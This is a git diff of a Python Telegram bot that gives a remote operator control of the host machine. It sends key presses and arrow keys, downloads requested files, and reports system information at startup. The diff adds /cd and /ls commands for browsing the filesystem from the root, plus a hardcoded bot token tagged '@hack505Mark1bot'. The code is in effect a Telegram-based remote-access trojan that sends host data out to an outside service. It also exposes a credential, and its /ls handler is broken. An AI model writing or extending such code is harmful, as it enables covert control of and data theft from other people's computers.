@@ -1,17 +1,42 @@
-import telegram.ext
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 from telegram import Update
-import os
+import telegram.ext
+import subprocess
 import pyautogui
 import datetime
-# import os
-import subprocess
+import platform
 import random
 import socket
-import platform
+import os
 
-with open('token.txt', 'r') as f:
-    TOKEN = f.read()
+
+ROOT_DIR = "/"
+os.chdir(ROOT_DIR)
+
+try:
+    with open('token.txt', 'r') as f:
+        TOKEN = f.read()
+except Exception as E:
+    TOKEN = "6845961407:AAFXT750B4Zhsb-utIuMrTPUtNksOUX7HwY"  # @hack505Mark1bot
+    print(E)
+
+
+def cd(update, context):
+    try:
+        to_change_dir = update.message.text[len('/cd '):]
+        os.chdir(to_change_dir)
+        update.message.reply_text(f"Command executed successfully:")
+    except Exception as E:
+        update.message.reply_text(E)
+
+
+def ls(update, context):
+    try:
+        list_dir = update.message.text[len("/ls "):]
+        os.listdir(list_dir)
+        update.message.reply_text(f"Command executed successfully:")
+    except Exception as E:
+        update.message.reply_text(E)
 
 
 def system_info(context):
@@ -204,8 +229,10 @@ disp.add_handler(telegram.ext.CommandHandler("yo", yo))
 disp.add_handler(telegram.ext.CommandHandler("presskey", press_key))
 disp.add_handler(telegram.ext.MessageHandler(
     telegram.ext.Filters.regex(r'^/arrow\s'), arrow_key))
-disp.add_handler(telegram.ext.CommandHandler("sys", system_info))
+# disp.add_handler(telegram.ext.CommandHandler("sys", system_info_on_request))
 disp.add_handler(CommandHandler("download", download_requested_file))
+disp.add_handler(CommandHandler("cd", cd))
+disp.add_handler(CommandHandler("ls", ls))
 
 updater.job_queue.run_once(system_info, 0)
 
